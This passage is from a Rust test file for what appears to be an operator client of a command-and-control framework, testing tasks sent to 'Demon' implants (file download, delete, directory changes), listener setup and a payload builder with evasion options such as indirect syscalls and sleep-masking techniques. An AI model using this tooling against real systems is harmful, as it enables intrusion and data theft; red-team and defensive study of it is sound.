        let expected = base64::engine::general_purpose::STANDARD.encode(path.as_bytes());
        assert_eq!(info.arguments.as_deref(), Some(expected.as_str()));
    }

    #[test]
    fn filesystem_transfer_task_encodes_unicode_path() {
        let path = "/home/用户/文件.txt";
        let info = filesystem_transfer_task("DEAD0006", &format!("cat {path}"), "cat", path);
        let expected = base64::engine::general_purpose::STANDARD.encode(path.as_bytes());
        assert_eq!(info.arguments.as_deref(), Some(expected.as_str()));
    }

    // -- build_file_browser_pwd_task --

    #[test]
    fn build_file_browser_pwd_task_produces_correct_shape() {
        let (head, info) = unwrap_agent_task(build_file_browser_pwd_task("BEEF0001", "alice"));
        assert_eq!(head.user, "alice");
        assert_eq!(info.demon_id, "BEEF0001");
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandFs).to_string());
        assert_eq!(info.command.as_deref(), Some("fs"));
        assert_eq!(info.sub_command.as_deref(), Some("pwd"));
        assert_eq!(info.command_line, "pwd");
        assert!(info.arguments.is_none());
    }

    // -- build_file_browser_cd_task --

    #[test]
    fn build_file_browser_cd_task_produces_correct_shape() {
        let (head, info) =
            unwrap_agent_task(build_file_browser_cd_task("BEEF0002", "/var/log", "bob"));
        assert_eq!(head.user, "bob");
        assert_eq!(info.demon_id, "BEEF0002");
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandFs).to_string());
        assert_eq!(info.sub_command.as_deref(), Some("cd"));
        assert_eq!(info.command_line, "cd /var/log");
        assert_eq!(info.arguments.as_deref(), Some("/var/log"));
    }

    #[test]
    fn build_file_browser_cd_task_handles_path_with_spaces() {
        let (_, info) = unwrap_agent_task(build_file_browser_cd_task(
            "BEEF0003",
            "C:\\Program Files\\App",
            "op",
        ));
        assert_eq!(info.arguments.as_deref(), Some("C:\\Program Files\\App"));
        assert_eq!(info.command_line, "cd C:\\Program Files\\App");
    }

    #[test]
    fn build_file_browser_cd_task_handles_unicode_path() {
        let (_, info) =
            unwrap_agent_task(build_file_browser_cd_task("BEEF0004", "/home/用户", "op"));
        assert_eq!(info.arguments.as_deref(), Some("/home/用户"));
    }

    // -- build_file_browser_download_task --

    #[test]
    fn build_file_browser_download_task_produces_correct_shape() {
        let (head, info) = unwrap_agent_task(build_file_browser_download_task(
            "CAFE0001",
            "/tmp/data.bin",
            "charlie",
        ));
        assert_eq!(head.user, "charlie");
        assert_eq!(info.demon_id, "CAFE0001");
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandFs).to_string());
        assert_eq!(info.sub_command.as_deref(), Some("download"));
        assert_eq!(info.command_line, "download /tmp/data.bin");
        let expected = base64::engine::general_purpose::STANDARD.encode(b"/tmp/data.bin");
        assert_eq!(info.arguments.as_deref(), Some(expected.as_str()));
    }

    #[test]
    fn build_file_browser_download_task_encodes_windows_backslash_path() {
        let path = r"C:\Users\admin\Documents\report.docx";
        let (_, info) = unwrap_agent_task(build_file_browser_download_task("CAFE0002", path, "op"));
        let expected = base64::engine::general_purpose::STANDARD.encode(path.as_bytes());
        assert_eq!(info.arguments.as_deref(), Some(expected.as_str()));
    }

    #[test]
    fn build_file_browser_download_task_encodes_unicode_path() {
        let path = "/données/résumé.pdf";
        let (_, info) = unwrap_agent_task(build_file_browser_download_task("CAFE0003", path, "op"));
        let expected = base64::engine::general_purpose::STANDARD.encode(path.as_bytes());
        assert_eq!(info.arguments.as_deref(), Some(expected.as_str()));
    }

    // -- build_file_browser_delete_task --

    #[test]
    fn build_file_browser_delete_task_produces_correct_shape() {
        let (head, info) =
            unwrap_agent_task(build_file_browser_delete_task("F00D0001", "/tmp/junk.log", "dave"));
        assert_eq!(head.user, "dave");
        assert_eq!(info.demon_id, "F00D0001");
        assert_eq!(info.command_id, u32::from(DemonCommand::CommandFs).to_string());
        assert_eq!(info.sub_command.as_deref(), Some("remove"));
        assert_eq!(info.command_line, "rm /tmp/junk.log");
        assert_eq!(info.arguments.as_deref(), Some("/tmp/junk.log"));
    }

    #[test]
    fn build_file_browser_delete_task_handles_path_with_spaces() {
        let path = "C:\\Program Files\\Old App\\config.ini";
        let (_, info) = unwrap_agent_task(build_file_browser_delete_task("F00D0002", path, "op"));
        assert_eq!(info.arguments.as_deref(), Some(path));
        assert_eq!(info.command_line, format!("rm {path}"));
    }

    #[test]
    fn build_file_browser_delete_task_handles_unicode_path() {
        let path = "/home/用户/临时文件.tmp";
        let (_, info) = unwrap_agent_task(build_file_browser_delete_task("F00D0003", path, "op"));
        assert_eq!(info.arguments.as_deref(), Some(path));
    }

    // -- cross-builder structural checks --

    #[test]
    fn all_file_browser_builders_set_session_event_code() {
        let builders: Vec<OperatorMessage> = vec![
            build_file_browser_pwd_task("A0000001", "op"),
            build_file_browser_cd_task("A0000002", "/tmp", "op"),
            build_file_browser_download_task("A0000003", "/tmp/f", "op"),
            build_file_browser_delete_task("A0000004", "/tmp/f", "op"),
        ];
        for msg in builders {
            let (head, _) = unwrap_agent_task(msg);
            assert_eq!(
                head.event,
                EventCode::Session,
                "file browser tasks must use Session event code"
            );
        }
    }

    #[test]
    fn all_file_browser_builders_produce_unique_task_ids() {
        let msgs: Vec<OperatorMessage> = vec![
            build_file_browser_pwd_task("B0000001", "op"),
            build_file_browser_cd_task("B0000002", "/a", "op"),
            build_file_browser_download_task("B0000003", "/b", "op"),
            build_file_browser_delete_task("B0000004", "/c", "op"),
        ];
        let mut ids: Vec<String> = msgs
            .into_iter()
            .map(|m| {
                let (_, info) = unwrap_agent_task(m);
                info.task_id
            })
            .collect();
        let count_before = ids.len();
        ids.sort();
        ids.dedup();
        assert_eq!(ids.len(), count_before, "task IDs should all be unique");
    }

    // ---- agent metadata extractor tests ----

    fn make_agent(overrides: impl FnOnce(&mut transport::AgentSummary)) -> transport::AgentSummary {
        let mut agent = transport::AgentSummary {
            name_id: "DEAD0001".into(),
            status: "alive".into(),
            domain_name: "CORP".into(),
            username: "admin".into(),
            internal_ip: "10.0.0.5".into(),
            external_ip: "203.0.113.1".into(),
            hostname: "WS01".into(),
            process_arch: "x64".into(),
            process_name: "svchost.exe".into(),
            process_pid: "1234".into(),
            elevated: false,
            os_version: "Windows 10".into(),
            os_build: "19045".into(),
            os_arch: "x86_64".into(),
            sleep_delay: "5".into(),
            sleep_jitter: "20".into(),
            last_call_in: "2s".into(),
            note: String::new(),
            pivot_parent: None,
            pivot_links: Vec::new(),
        };
        overrides(&mut agent);
        agent
    }

    #[test]
    fn agent_ip_prefers_internal() {
        let agent = make_agent(|_| {});
        assert_eq!(agent_ip(&agent), "10.0.0.5");
    }

    #[test]
    fn agent_ip_falls_back_to_external_when_internal_empty() {
        let agent = make_agent(|a| a.internal_ip = String::new());
        assert_eq!(agent_ip(&agent), "203.0.113.1");
    }

    #[test]
    fn agent_ip_falls_back_to_external_when_internal_whitespace() {
        let agent = make_agent(|a| a.internal_ip = "   ".into());
        assert_eq!(agent_ip(&agent), "203.0.113.1");
    }

    #[test]
    fn agent_arch_prefers_process_arch() {
        let agent = make_agent(|_| {});
        assert_eq!(agent_arch(&agent), "x64");
    }

    #[test]
    fn agent_arch_falls_back_to_os_arch_when_process_arch_empty() {
        let agent = make_agent(|a| a.process_arch = String::new());
        assert_eq!(agent_arch(&agent), "x86_64");
    }

    #[test]
    fn agent_arch_falls_back_to_os_arch_when_process_arch_whitespace() {
        let agent = make_agent(|a| a.process_arch = "  ".into());
        assert_eq!(agent_arch(&agent), "x86_64");
    }

    #[test]
    fn agent_os_includes_build_when_present() {
        let agent = make_agent(|_| {});
        assert_eq!(agent_os(&agent), "Windows 10 (19045)");
    }

    #[test]
    fn agent_os_returns_version_only_when_build_empty() {
        let agent = make_agent(|a| a.os_build = String::new());
        assert_eq!(agent_os(&agent), "Windows 10");
    }

    #[test]
    fn agent_os_returns_version_only_when_build_whitespace() {
        let agent = make_agent(|a| a.os_build = "   ".into());
        assert_eq!(agent_os(&agent), "Windows 10");
    }

    #[test]
    fn agent_sleep_jitter_both_present() {
        let agent = make_agent(|_| {});
        assert_eq!(agent_sleep_jitter(&agent), "5s / 20%");
    }

    #[test]
    fn agent_sleep_jitter_delay_only() {
        let agent = make_agent(|a| a.sleep_jitter = String::new());
        assert_eq!(agent_sleep_jitter(&agent), "5");
    }

    #[test]
    fn agent_sleep_jitter_jitter_only() {
        let agent = make_agent(|a| a.sleep_delay = String::new());
        assert_eq!(agent_sleep_jitter(&agent), "j20%");
    }

    #[test]
    fn agent_sleep_jitter_both_empty() {
        let agent = make_agent(|a| {
            a.sleep_delay = String::new();
            a.sleep_jitter = String::new();
        });
        assert_eq!(agent_sleep_jitter(&agent), "");
    }

    #[test]
    fn agent_sleep_jitter_whitespace_treated_as_empty() {
        let agent = make_agent(|a| {
            a.sleep_delay = "  ".into();
            a.sleep_jitter = "  ".into();
        });
        assert_eq!(agent_sleep_jitter(&agent), "");
    }

    #[test]
    fn agent_metadata_all_empty() {
        let agent = make_agent(|a| {
            a.internal_ip = String::new();
            a.external_ip = String::new();
            a.process_arch = String::new();
            a.os_arch = String::new();
            a.os_version = String::new();
            a.os_build = String::new();
            a.sleep_delay = String::new();
            a.sleep_jitter = String::new();
        });
        assert_eq!(agent_ip(&agent), "");
        assert_eq!(agent_arch(&agent), "");
        assert_eq!(agent_os(&agent), "");
        assert_eq!(agent_sleep_jitter(&agent), "");
    }

    // ---- ellipsize tests ----

    #[test]
    fn ellipsize_shorter_than_max() {
        assert_eq!(ellipsize("hello", 10), "hello");
    }

    #[test]
    fn ellipsize_exactly_at_max() {
        assert_eq!(ellipsize("hello", 5), "hello");
    }

    #[test]
    fn ellipsize_longer_than_max() {
        assert_eq!(ellipsize("hello world", 5), "hell...");
    }

    #[test]
    fn ellipsize_max_one() {
        // max_chars=1 means we break at index 0, so empty prefix + "..."
        assert_eq!(ellipsize("hello", 1), "...");
    }

    #[test]
    fn ellipsize_max_zero() {
        assert_eq!(ellipsize("hello", 0), "...");
    }

    #[test]
    fn ellipsize_empty_string() {
        assert_eq!(ellipsize("", 5), "");
    }

    #[test]
    fn ellipsize_multibyte_chars() {
        // "héllo" is 5 chars; max_chars=3 should keep 2 chars + "..."
        assert_eq!(ellipsize("héllo", 3), "hé...");
    }

    // ---- blank_if_empty tests ----

    #[test]
    fn blank_if_empty_returns_value_when_non_empty() {
        assert_eq!(blank_if_empty("hello", "fallback"), "hello");
    }

    #[test]
    fn blank_if_empty_returns_fallback_for_empty_string() {
        assert_eq!(blank_if_empty("", "fallback"), "fallback");
    }

    #[test]
    fn blank_if_empty_returns_fallback_for_whitespace() {
        assert_eq!(blank_if_empty("   ", "fallback"), "fallback");
    }

    #[test]
    fn blank_if_empty_returns_fallback_for_tab_and_newline() {
        assert_eq!(blank_if_empty("\t\n", "fallback"), "fallback");
    }

    // ---- console_completion_candidates tests ----

    #[test]
    fn completion_empty_prefix_returns_all_commands() {
        let all = console_completion_candidates("");
        assert_eq!(all.len(), CONSOLE_COMMANDS.len());
        for spec in &CONSOLE_COMMANDS {
            assert!(all.contains(&spec.name), "missing command: {}", spec.name);
        }
    }

    #[test]
    fn completion_prefix_matches_command_names() {
        let matches = console_completion_candidates("sc");
        assert_eq!(matches, vec!["screenshot"]);
    }

    #[test]
    fn completion_prefix_matches_via_alias() {
        // "exit" is an alias for "kill"
        let matches = console_completion_candidates("ex");
        assert!(matches.contains(&"kill"), "expected 'kill' via alias 'exit'");
    }

    #[test]
    fn completion_no_match_returns_empty() {
        let matches = console_completion_candidates("zzz");
        assert!(matches.is_empty());
    }

    #[test]
    fn completion_case_insensitive() {
        let matches = console_completion_candidates("SC");
        assert_eq!(matches, vec!["screenshot"]);
    }

    #[test]
    fn completion_whitespace_only_prefix_returns_all() {
        let all = console_completion_candidates("   ");
        assert_eq!(all.len(), CONSOLE_COMMANDS.len());
    }

    // ---- closest_command_usage tests ----

    #[test]
    fn closest_usage_known_command() {
        assert_eq!(closest_command_usage("kill"), Some("kill [process]"));
    }

    #[test]
    fn closest_usage_via_alias() {
        // "exit" is an alias for "kill", should return kill's usage
        assert_eq!(closest_command_usage("exit"), Some("kill [process]"));
    }

    #[test]
    fn closest_usage_unknown_returns_none() {
        assert_eq!(closest_command_usage("nonexistent"), None);
    }

    #[test]
    fn closest_usage_empty_string_returns_none() {
        assert_eq!(closest_command_usage(""), None);
    }

    // ---- script_status_label ----

    #[test]
    fn script_status_label_loaded() {
        assert_eq!(script_status_label(ScriptLoadStatus::Loaded), "loaded");
    }

    #[test]
    fn script_status_label_error() {
        assert_eq!(script_status_label(ScriptLoadStatus::Error), "error");
    }

    #[test]
    fn script_status_label_unloaded() {
        assert_eq!(script_status_label(ScriptLoadStatus::Unloaded), "unloaded");
    }

    #[test]
    fn script_status_label_all_variants_non_empty() {
        for status in
            [ScriptLoadStatus::Loaded, ScriptLoadStatus::Error, ScriptLoadStatus::Unloaded]
        {
            assert!(!script_status_label(status).is_empty());
        }
    }

    // ---- script_status_color ----

    #[test]
    fn script_status_color_loaded() {
        assert_eq!(script_status_color(ScriptLoadStatus::Loaded), Color32::from_rgb(110, 199, 141));
    }

    #[test]
    fn script_status_color_error() {
        assert_eq!(script_status_color(ScriptLoadStatus::Error), Color32::from_rgb(215, 83, 83));
    }

    #[test]
    fn script_status_color_unloaded() {
        assert_eq!(
            script_status_color(ScriptLoadStatus::Unloaded),
            Color32::from_rgb(232, 182, 83)
        );
    }

    #[test]
    fn script_status_color_all_variants_distinct() {
        let colors: Vec<Color32> =
            [ScriptLoadStatus::Loaded, ScriptLoadStatus::Error, ScriptLoadStatus::Unloaded]
                .iter()
                .map(|s| script_status_color(*s))
                .collect();
        assert_ne!(colors[0], colors[1]);
        assert_ne!(colors[1], colors[2]);
        assert_ne!(colors[0], colors[2]);
    }

    // ---- script_output_label ----

    #[test]
    fn script_output_label_stdout() {
        assert_eq!(script_output_label(ScriptOutputStream::Stdout), "stdout");
    }

    #[test]
    fn script_output_label_stderr() {
        assert_eq!(script_output_label(ScriptOutputStream::Stderr), "stderr");
    }

    #[test]
    fn script_output_label_all_variants_non_empty() {
        for stream in [ScriptOutputStream::Stdout, ScriptOutputStream::Stderr] {
            assert!(!script_output_label(stream).is_empty());
        }
    }

    // ---- script_output_color ----

    #[test]
    fn script_output_color_stdout() {
        assert_eq!(
            script_output_color(ScriptOutputStream::Stdout),
            Color32::from_rgb(110, 199, 141)
        );
    }

    #[test]
    fn script_output_color_stderr() {
        assert_eq!(script_output_color(ScriptOutputStream::Stderr), Color32::from_rgb(215, 83, 83));
    }

    #[test]
    fn script_output_color_variants_distinct() {
        assert_ne!(
            script_output_color(ScriptOutputStream::Stdout),
            script_output_color(ScriptOutputStream::Stderr)
        );
    }

    // ---- script_name_for_display ----

    #[test]
    fn script_name_for_display_extracts_stem() {
        assert_eq!(
            script_name_for_display(Path::new("/home/user/scripts/recon.py")),
            Some("recon".to_owned())
        );
    }

    #[test]
    fn script_name_for_display_no_extension() {
        assert_eq!(
            script_name_for_display(Path::new("/usr/bin/myscript")),
            Some("myscript".to_owned())
        );
    }

    #[test]
    fn script_name_for_display_just_filename() {
        assert_eq!(script_name_for_display(Path::new("tool.py")), Some("tool".to_owned()));
    }

    #[test]
    fn script_name_for_display_empty_path() {
        assert_eq!(script_name_for_display(Path::new("")), None);
    }

    #[test]
    fn script_name_for_display_root_path() {
        assert_eq!(script_name_for_display(Path::new("/")), None);
    }

    // ---- role_badge_color ----

    #[test]
    fn role_badge_color_admin() {
        assert_eq!(role_badge_color(Some("admin")), Color32::from_rgb(220, 80, 60));
    }

    #[test]
    fn role_badge_color_admin_case_insensitive() {
        assert_eq!(role_badge_color(Some("Admin")), Color32::from_rgb(220, 80, 60));
        assert_eq!(role_badge_color(Some("ADMIN")), Color32::from_rgb(220, 80, 60));
    }

    #[test]
    fn role_badge_color_operator() {
        assert_eq!(role_badge_color(Some("operator")), Color32::from_rgb(60, 130, 220));
    }

    #[test]
    fn role_badge_color_readonly_variants() {
        let expected = Color32::from_rgb(100, 180, 100);
        assert_eq!(role_badge_color(Some("readonly")), expected);
        assert_eq!(role_badge_color(Some("read-only")), expected);
        assert_eq!(role_badge_color(Some("analyst")), expected);
    }

    #[test]
    fn role_badge_color_unknown_role() {
        assert_eq!(role_badge_color(Some("superuser")), Color32::from_rgb(140, 140, 140));
    }

    #[test]
    fn role_badge_color_none() {
        assert_eq!(role_badge_color(None), Color32::from_rgb(140, 140, 140));
    }

    // ---- session_graph_status_color ----

    #[test]
    fn session_graph_status_color_active_variants() {
        let active_color = Color32::from_rgb(84, 170, 110);
        assert_eq!(session_graph_status_color("active"), active_color);
        assert_eq!(session_graph_status_color("alive"), active_color);
        assert_eq!(session_graph_status_color("online"), active_color);
        assert_eq!(session_graph_status_color("true"), active_color);
    }

    #[test]
    fn session_graph_status_color_active_case_insensitive() {
        let active_color = Color32::from_rgb(84, 170, 110);
        assert_eq!(session_graph_status_color("Active"), active_color);
        assert_eq!(session_graph_status_color("ALIVE"), active_color);
    }

    #[test]
    fn session_graph_status_color_dead() {
        let dead_color = Color32::from_rgb(174, 68, 68);
        assert_eq!(session_graph_status_color("dead"), dead_color);
        assert_eq!(session_graph_status_color("offline"), dead_color);
    }

    #[test]
    fn session_graph_status_color_unknown() {
        assert_eq!(session_graph_status_color("something_else"), Color32::from_rgb(174, 68, 68));
    }

    // ── Listener dialog & message builder tests ─────────────────────

    #[test]
    fn listener_protocol_label_round_trips() {
        for proto in ListenerProtocol::ALL {
            let label = proto.label();
            assert!(!label.is_empty());
        }
        assert_eq!(ListenerProtocol::Http.label(), "Http");
        assert_eq!(ListenerProtocol::Https.label(), "Https");
        assert_eq!(ListenerProtocol::Smb.label(), "Smb");
        assert_eq!(ListenerProtocol::External.label(), "External");
    }

    #[test]
    fn listener_dialog_new_create_defaults() {
        let dialog = ListenerDialogState::new_create();
        assert_eq!(dialog.mode, ListenerDialogMode::Create);
        assert_eq!(dialog.protocol, ListenerProtocol::Http);
        assert!(dialog.name.is_empty());
        assert!(dialog.host.is_empty());
        assert!(dialog.port.is_empty());
        assert!(!dialog.proxy_enabled);
    }

    #[test]
    fn listener_dialog_to_info_http() {
        let mut dialog = ListenerDialogState::new_create();
        dialog.name = "test-http".to_owned();
        dialog.protocol = ListenerProtocol::Http;
        dialog.host = "0.0.0.0".to_owned();
        dialog.port = "8080".to_owned();
        dialog.user_agent = "TestAgent/1.0".to_owned();
        dialog.headers = "X-Custom: val".to_owned();
        dialog.uris = "/api/v1".to_owned();
        dialog.host_header = "example.com".to_owned();

        let info = dialog.to_listener_info();
        assert_eq!(info.name.as_deref(), Some("test-http"));
        assert_eq!(info.protocol.as_deref(), Some("Http"));
        assert_eq!(info.host_bind.as_deref(), Some("0.0.0.0"));
        assert_eq!(info.port_bind.as_deref(), Some("8080"));
        assert_eq!(info.user_agent.as_deref(), Some("TestAgent/1.0"));
        assert_eq!(info.headers.as_deref(), Some("X-Custom: val"));
        assert_eq!(info.uris.as_deref(), Some("/api/v1"));
        assert_eq!(info.secure.as_deref(), Some("false"));
        assert_eq!(info.proxy_enabled.as_deref(), Some("false"));
        // Proxy fields should be None when not enabled
        assert!(info.proxy_type.is_none());
        assert!(info.proxy_host.is_none());
        // HostHeader is in extra
        assert_eq!(info.extra.get("HostHeader").and_then(|v| v.as_str()), Some("example.com"));
    }

    #[test]
    fn listener_dialog_to_info_https_with_proxy() {
        let mut dialog = ListenerDialogState::new_create();
        dialog.name = "test-https".to_owned();
        dialog.protocol = ListenerProtocol::Https;
        dialog.host = "0.0.0.0".to_owned();
        dialog.port = "443".to_owned();
        dialog.proxy_enabled = true;
        dialog.proxy_type = "http".to_owned();
        dialog.proxy_host = "proxy.local".to_owned();
        dialog.proxy_port = "3128".to_owned();
        dialog.proxy_username = "user".to_owned();
        dialog.proxy_password = Zeroizing::new("pass".to_owned());

        let info = dialog.to_listener_info();
        assert_eq!(info.protocol.as_deref(), Some("Https"));
        assert_eq!(info.secure.as_deref(), Some("true"));
        assert_eq!(info.proxy_enabled.as_deref(), Some("true"));
        assert_eq!(info.proxy_type.as_deref(), Some("http"));
        assert_eq!(info.proxy_host.as_deref(), Some("proxy.local"));
        assert_eq!(info.proxy_port.as_deref(), Some("3128"));
        assert_eq!(info.proxy_username.as_deref(), Some("user"));
        assert_eq!(info.proxy_password.as_deref(), Some("pass"));
    }

    /// The proxy_password field must be `Zeroizing<String>` so that heap memory is wiped on drop.
    /// This test is a compile-time contract: if the field type is changed to a bare `String`,
    /// the `Zeroizing::clone` call below will fail to compile.
    #[test]
    fn proxy_password_field_is_zeroizing() {
        let mut dialog = ListenerDialogState::new_create();
        *dialog.proxy_password = "secret".to_owned();
        // Confirm we hold a Zeroizing<String> — the explicit type annotation is the assertion.
        let _z: Zeroizing<String> = dialog.proxy_password.clone();
        assert_eq!(*_z, "secret");
    }

    #[test]
    fn listener_dialog_to_info_smb() {
        let mut dialog = ListenerDialogState::new_create();
        dialog.name = "smb-pipe".to_owned();
        dialog.protocol = ListenerProtocol::Smb;
        dialog.pipe_name = r"\\.\pipe\mypipe".to_owned();

        let info = dialog.to_listener_info();
        assert_eq!(info.name.as_deref(), Some("smb-pipe"));
        assert_eq!(info.protocol.as_deref(), Some("Smb"));
        assert_eq!(info.extra.get("PipeName").and_then(|v| v.as_str()), Some(r"\\.\pipe\mypipe"));
        // HTTP-specific fields should be default
        assert!(info.host_bind.is_none());
        assert!(info.port_bind.is_none());
    }

    #[test]
    fn listener_dialog_to_info_external() {
        let mut dialog = ListenerDialogState::new_create();
        dialog.name = "ext-listener".to_owned();
        dialog.protocol = ListenerProtocol::External;
        dialog.endpoint = "/callback".to_owned();

        let info = dialog.to_listener_info();
        assert_eq!(info.name.as_deref(), Some("ext-listener"));
        assert_eq!(info.protocol.as_deref(), Some("External"));
        assert_eq!(info.extra.get("Endpoint").and_then(|v| v.as_str()), Some("/callback"));
    }

    #[test]
    fn listener_dialog_new_edit_preserves_fields() {
        let mut source = ListenerInfo::default();
        source.host_bind = Some("10.0.0.1".to_owned());
        source.port_bind = Some("8443".to_owned());
        source.user_agent = Some("MyAgent".to_owned());
        source.proxy_enabled = Some("true".to_owned());
        source.proxy_type = Some("https".to_owned());
        source.proxy_host = Some("px.local".to_owned());
        source.extra.insert("PipeName".to_owned(), serde_json::Value::String("pipe1".to_owned()));

        let dialog = ListenerDialogState::new_edit("mylistener", "Https", &source);
        assert_eq!(dialog.mode, ListenerDialogMode::Edit);
        assert_eq!(dialog.name, "mylistener");
        assert_eq!(dialog.protocol, ListenerProtocol::Https);
        assert_eq!(dialog.host, "10.0.0.1");
        assert_eq!(dialog.port, "8443");
        assert_eq!(dialog.user_agent, "MyAgent");
        assert!(dialog.proxy_enabled);
        assert_eq!(dialog.proxy_type, "https");
        assert_eq!(dialog.proxy_host, "px.local");
        assert_eq!(dialog.pipe_name, "pipe1");
    }

    #[test]
    fn build_listener_new_creates_correct_message() {
        let info = ListenerInfo {
            name: Some("http-1".to_owned()),
            protocol: Some("Http".to_owned()),
            ..ListenerInfo::default()
        };
        let msg = build_listener_new(info, "operator1");
        match msg {
            OperatorMessage::ListenerNew(m) => {
                assert_eq!(m.head.event, EventCode::Listener);
                assert_eq!(m.head.user, "operator1");
                assert_eq!(m.info.name.as_deref(), Some("http-1"));
            }
            _ => panic!("expected ListenerNew"),
        }
    }

    #[test]
    fn build_listener_edit_creates_correct_message() {
        let info = ListenerInfo { name: Some("http-1".to_owned()), ..ListenerInfo::default() };
        let msg = build_listener_edit(info, "op2");
        match msg {
            OperatorMessage::ListenerEdit(m) => {
                assert_eq!(m.head.event, EventCode::Listener);
                assert_eq!(m.head.user, "op2");
            }
            _ => panic!("expected ListenerEdit"),
        }
    }

    #[test]
    fn build_listener_remove_creates_correct_message() {
        let msg = build_listener_remove("http-1", "op3");
        match msg {
            OperatorMessage::ListenerRemove(m) => {
                assert_eq!(m.head.event, EventCode::Listener);
                assert_eq!(m.head.user, "op3");
                assert_eq!(m.info.name, "http-1");
            }
            _ => panic!("expected ListenerRemove"),
        }
    }

    #[test]
    fn listener_dialog_http_empty_optional_fields_produce_none() {
        let mut dialog = ListenerDialogState::new_create();
        dialog.name = "minimal".to_owned();
        dialog.protocol = ListenerProtocol::Http;
        dialog.host = "0.0.0.0".to_owned();
        dialog.port = "80".to_owned();
        // Leave user_agent, headers, uris, host_header all empty

        let info = dialog.to_listener_info();
        assert!(info.user_agent.is_none());
        assert!(info.headers.is_none());
        assert!(info.uris.is_none());
        assert!(!info.extra.contains_key("HostHeader"));
    }

    // ── Payload dialog tests ────────────────────────────────────────

    #[test]
    fn payload_dialog_new_defaults() {
        let dialog = PayloadDialogState::new();
        assert_eq!(dialog.agent_type, "Demon");
        assert!(dialog.listener.is_empty());
        assert_eq!(dialog.arch, PayloadArch::X64);
        assert_eq!(dialog.format, PayloadFormat::WindowsExe);
        assert_eq!(dialog.sleep, "2");
        assert_eq!(dialog.jitter, "20");
        assert!(dialog.indirect_syscall);
        assert_eq!(dialog.sleep_technique, SleepTechnique::WaitForSingleObjectEx);
        assert_eq!(dialog.alloc, AllocMethod::NativeSyscall);
        assert_eq!(dialog.execute, ExecuteMethod::NativeSyscall);
        assert_eq!(dialog.spawn64, r"C:\Windows\System32\notepad.exe");
        assert_eq!(dialog.spawn32, r"C:\Windows\SysWOW64\notepad.exe");
        assert!(!dialog.building);
    }

    #[test]
    fn payload_dialog_config_json_contains_all_fields() {
        let dialog = PayloadDialogState::new();
        let json_str = dialog.config_json();
        let parsed: serde_json::Value = serde_json::from_str(&json_str).unwrap();

        assert_eq!(parsed["Sleep"], "2");
        assert_eq!(parsed["Jitter"], "20");
        assert_eq!(parsed["IndirectSyscall"], true);
        assert_eq!(parsed["SleepTechnique"], "WaitForSingleObjectEx");
        assert_eq!(parsed["Alloc"], "Native/Syscall");
        assert_eq!(parsed["Execute"], "Native/Syscall");
        assert_eq!(parsed["Spawn64"], r"C:\Windows\System32\notepad.exe");
        assert_eq!(parsed["Spawn32"], r"C:\Windows\SysWOW64\notepad.exe");
    }

    #[test]
    fn payload_dialog_config_json_reflects_changes() {
        let mut dialog = PayloadDialogState::new();
        dialog.sleep = "10".to_owned();
        dialog.jitter = "50".to_owned();
        dialog.indirect_syscall = false;
        dialog.sleep_technique = SleepTechnique::Ekko;
        dialog.alloc = AllocMethod::Win32;
        dialog.execute = ExecuteMethod::Win32;

        let json_str = dialog.config_json();
        let parsed: serde_json::Value = serde_json::from_str(&json_str).unwrap();

        assert_eq!(parsed["Sleep"], "10");
        assert_eq!(parsed["Jitter"], "50");
        assert_eq!(parsed["IndirectSyscall"], false);
        assert_eq!(parsed["SleepTechnique"], "Ekko");
        assert_eq!(parsed["Alloc"], "Win32");
        assert_eq!(parsed["Execute"], "Win32");
    }

    #[test]
    fn build_payload_request_creates_correct_message() {
        let mut dialog = PayloadDialogState::new();
        dialog.listener = "http-listener".to_owned();
        dialog.arch = PayloadArch::X86;
        dialog.format = PayloadFormat::WindowsShellcode;

        let msg = build_payload_request(&dialog, "operator1");
        match msg {
            OperatorMessage::BuildPayloadRequest(m) => {
                assert_eq!(m.head.event, EventCode::Gate);
                assert_eq!(m.head.user, "operator1");
                assert_eq!(m.info.agent_type, "Demon");
                assert_eq!(m.info.listener, "http-listener");
                assert_eq!(m.info.arch, "x86");
                assert_eq!(m.info.format, "Windows Shellcode");
                // Config should be valid JSON
                let config: serde_json::Value = serde_json::from_str(&m.info.config).unwrap();
                assert_eq!(config["Sleep"], "2");
            }
            _ => panic!("expected BuildPayloadRequest"),
        }
    }

    #[test]
    fn payload_arch_labels() {
        assert_eq!(PayloadArch::X64.label(), "x64");
        assert_eq!(PayloadArch::X86.label(), "x86");
    }

    #[test]
    fn payload_format_labels() {
        assert_eq!(PayloadFormat::WindowsExe.label(), "Windows Exe");
        assert_eq!(PayloadFormat::WindowsServiceExe.label(), "Windows Service Exe");
        assert_eq!(PayloadFormat::WindowsDll.label(), "Windows Dll");
        assert_eq!(PayloadFormat::WindowsReflectiveDll.label(), "Windows Reflective Dll");
        assert_eq!(PayloadFormat::WindowsShellcode.label(), "Windows Shellcode");
    }

    #[test]
    fn sleep_technique_labels() {
        assert_eq!(SleepTechnique::WaitForSingleObjectEx.label(), "WaitForSingleObjectEx");
        assert_eq!(SleepTechnique::Ekko.label(), "Ekko");
        assert_eq!(SleepTechnique::Zilean.label(), "Zilean");
        assert_eq!(SleepTechnique::None.label(), "None");
    }

    #[test]
    fn alloc_execute_method_labels() {
        assert_eq!(AllocMethod::NativeSyscall.label(), "Native/Syscall");
        assert_eq!(AllocMethod::Win32.label(), "Win32");
        assert_eq!(ExecuteMethod::NativeSyscall.label(), "Native/Syscall");
        assert_eq!(ExecuteMethod::Win32.label(), "Win32");
    }

    #[test]
    fn build_console_message_color_mapping() {
        assert_eq!(build_console_message_color("Good"), Color32::from_rgb(85, 255, 85));
        assert_eq!(build_console_message_color("Error"), Color32::from_rgb(255, 85, 85));
        assert_eq!(build_console_message_color("Warning"), Color32::from_rgb(255, 200, 50));
        assert_eq!(build_console_message_color("Info"), Color32::from_rgb(180, 180, 220));
        assert_eq!(build_console_message_color("unknown"), Color32::from_rgb(180, 180, 220));
    }

    #[test]
    fn build_console_message_prefix_mapping() {
        assert_eq!(build_console_message_prefix("Good"), "[+]");
        assert_eq!(build_console_message_prefix("Error"), "[-]");
        assert_eq!(build_console_message_prefix("Warning"), "[!]");
        assert_eq!(build_console_message_prefix("Info"), "[*]");
        assert_eq!(build_console_message_prefix("other"), "[*]");
    }

    // ---- console prompt format tests ----

    #[test]
    fn format_console_prompt_includes_operator_and_agent_id() {
        let prompt = format_console_prompt("alice", "DEAD1234");
        assert_eq!(prompt, "[alice/DEAD1234] demon.x64 >> ");
    }

    #[test]
